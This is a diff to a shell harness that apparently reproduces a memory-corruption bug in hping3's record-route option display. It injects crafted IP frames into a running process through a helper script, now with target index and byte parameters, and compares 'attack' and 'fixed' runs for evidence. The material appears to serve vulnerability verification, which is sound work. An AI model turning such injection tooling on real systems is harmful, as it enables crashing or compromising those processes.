@@ -12,7 +12,8 @@ EXPECT=${EXPECT:-attack}
 FILL=${FILL:-0}
 I0=${I0:-32}
 J0=${J0:-128}
-RUN_TAG=${RUN_TAG:-$EXPECT}
+TARGET_INDEX=${TARGET_INDEX:--1}
+TARGET_BYTE=${TARGET_BYTE:-0}
 [ -x "$BIN" ] || { echo "$BIN missing"; exit 2; }
 src="${BIN%/hping3}/display_ipopt.c"
 sha=$(sha256sum "$src" | cut -d' ' -f1)
@@ -77,16 +78,19 @@ if [ "$EXPECT" = baseline ]; then
     echo "baseline: no crafted frames"
 elif [ "$EXPECT" = fixed ]; then
     sudo -n python3 inject_rr_ij.py --pid "$pid" --ptr 255 --rr-len 255 \
-        --i0 "$I0" --j0 "$J0" --fill "$FILL" --count 3 --gap 0.15
+        --i0 "$I0" --j0 "$J0" --fill "$FILL" --target-index "$TARGET_INDEX" \
+        --target-byte "$TARGET_BYTE" --count 3 --gap 0.15
 else
     sudo -n python3 inject_rr_ij.py --pid "$pid" --ptr 255 --rr-len 255 \
-        --i0 "$I0" --j0 "$J0" --fill "$FILL" --count 3 --gap 0.15
+        --i0 "$I0" --j0 "$J0" --fill "$FILL" --target-index "$TARGET_INDEX" \
+        --target-byte "$TARGET_BYTE" --count 3 --gap 0.15
 fi
 wait "$gp"
 kill "$hp" 2>/dev/null
 wait "$hp" 2>/dev/null
 
 python3 check_ij.py "$gd" "$run" --fill "$FILL" --i0 "$I0" --j0 "$J0" \
+    --target-index "$TARGET_INDEX" --target-byte "$TARGET_BYTE" \
     --expect "$EXPECT" > "evidence/ij-$tag-proof.out"
 cat "evidence/ij-$tag-proof.out"
 grep -q 'IJ SUMMARY: .* PASS' "evidence/ij-$tag-proof.out" && exit 0 || exit 1
